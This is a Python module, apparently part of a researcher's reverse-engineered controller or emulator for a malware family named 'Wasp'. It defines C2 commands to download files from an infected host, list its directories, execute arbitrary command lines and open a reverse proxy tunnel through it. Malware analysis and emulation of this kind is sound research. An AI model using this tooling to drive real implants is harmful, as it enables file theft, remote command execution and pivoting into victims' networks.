#!/usr/bin/env python3
from __future__ import annotations
from typing import Dict, List, Optional
from pathlib import Path
import logging
import base64

from wasp_types import WaspCommand, WaspResponse, WaspMalware, logger, WaspCommandClass

@WaspCommandClass
class WaspCommandHandshake(WaspCommand):
    name: str = "handshake"
    def __init__(self, wasp = None) -> None:
        super().__init__(wasp)

    def get_dict(self) -> Dict:
        return {
            "uri": self.name
        }

@WaspCommandClass
class WaspCommandDownload(WaspCommand):
    name: str = "download"
    path: Path
    breakpoint: bool = True
    start: int = 0
    end: int = 1024


    def __init__(self, wasp: WaspMalware, path: Path | str) -> None:
        super().__init__(wasp)
        if isinstance(path, str):
            path = Path(path)
        self.path = path

    def get_dict(self) -> Dict:
        return {
            'uri': self.name,
            'headers': {
                'File-Path': str(self.path),
                # @ 0x418b92
                #'Accept-Encoding': 'gzip',
                # @ 0x434910
                'Break-Point': self.breakpoint,
                'Begin-Position': self.start,
                'End-Position': self.end,
            },
        }

    @classmethod
    def from_dict(cls, wasp: WaspMalware, source: Dict) -> WaspCommand:
        path: str = source["headers"]["File-Path"]
        command: WaspCommand = cls(wasp, path)
        return command

    def handle_response(self, response: WaspResponse):
        # TODO: Handle Windows??
        destination_directory = self.wasp.collection_directory / "files" / Path(str(self.path)[1:]).parent
        destination_directory.mkdir(parents=True, exist_ok=True)
        destination = destination_directory / self.path.name
        destination.write_bytes(response.data)


@WaspCommandClass
class WaspCommandFileList(WaspCommand):
    name: str = 'filelist'
    path: Path
    logger: logging.Logger = logger.getChild('WaspCommandFileList')

    def __init__(self, wasp: WaspMalware, path: Path | str) -> None:
        super().__init__(wasp)
        if isinstance(path, str):
            path = Path(path)
        self.path = path


    def get_dict(self) -> Dict:
        return {
            'uri': self.name,
            'headers': {
                'File-Path': str(self.path),
            },
        }

    @classmethod
    def from_dict(cls, wasp: WaspMalware, source: Dict) -> WaspCommand:
        path: str = source["headers"]["File-Path"]
        command: WaspCommand = cls(wasp, path)
        return command

    def handle_response(self, response: WaspResponse):
        listing_text: str = response.data.decode('utf-8')
        self.logger.info(f"\nIs File\tSize\tName\n{listing_text}")

        date_stamp = self.generated_date.strftime("%Y%m%d_%H%M%S")
        destination_directory = self.wasp.collection_directory / "directory_listings"
        destination_directory.mkdir(parents=True, exist_ok=True)
        destination = destination_directory / f"{date_stamp}-DirectoryListing-{self.command_id}.txt"
        destination.write_bytes(response.data)


@WaspCommandClass
class WaspCommandExecute(WaspCommand):
    name: str = 'command'
    command: str
    logger: logging.Logger = logger.getChild("Execute")
    def __init__(self, wasp: WaspMalware, command: str):
        super().__init__(wasp)
        self.command = command

    def get_dict(self) -> Dict:
        return {
            "uri": self.name,
            "headers": {
                "Command-Line": self.command
            }
        }

    @classmethod
    def from_dict(cls, wasp: WaspMalware, source: Dict) -> WaspCommand:
        command_line: str = source["headers"]["Command-Line"]
        command: WaspCommand = cls(wasp, command_line)
        return command

    def handle_response(self, response: WaspResponse):
        output: Optional[bytes | str] = None
        try:
            output = response.data.decode('utf-8')
        except UnicodeDecodeError:
            output = base64.b64encode(response.data).decode('utf-8')
        self.logger.info(f"Command: {self.command}")
        self.logger.info(f"Result: {output}")
        return output

@WaspCommandClass
class WaspCommandProxy(WaspCommand):
    """ This command connects to the C2 server on "reverse_port", then connects to
    "destination_host" on "destination_port", and forwards data between the two.
    When either socket closes, the tunnel is terminated.
    """
    name: str = "proxy"
    logger: logging.Logger = logger.getChild("Proxy")

    destination_host: str
    destination_port: int

    reverse_port: int

    def __init__(self, wasp: WaspMalware, reverse_port: int, destination_host: str, destination_port: int):
        super().__init__(wasp)
        self.destination_host = destination_host
        self.destination_port = destination_port
        self.reverse_port = reverse_port

    def get_dict(self) -> Dict:
        return {
            "uri": self.name,
            "headers": {
                "Reverse-Port": self.reverse_port,
                "Dest-Host": self.destination_host,
                "Dest-Port": self.destination_port,
            }
        }

    @classmethod
    def from_dict(cls, wasp: WaspMalware, source: Dict) -> WaspCommand:
        destination_host: str = source["headers"]["Dest-Host"]
        destination_port: int = source["headers"]["Dest-Port"]
        reverse_port: int = source["headers"]["Reverse-Port"]
        command: WaspCommand = cls(wasp, reverse_port, destination_host, destination_port)
        return command

    def handle_response(self, response: WaspResponse):
        self.logger.info(f"Proxying {self.reverse_port} to {self.destination_host}:{self.destination_port}")

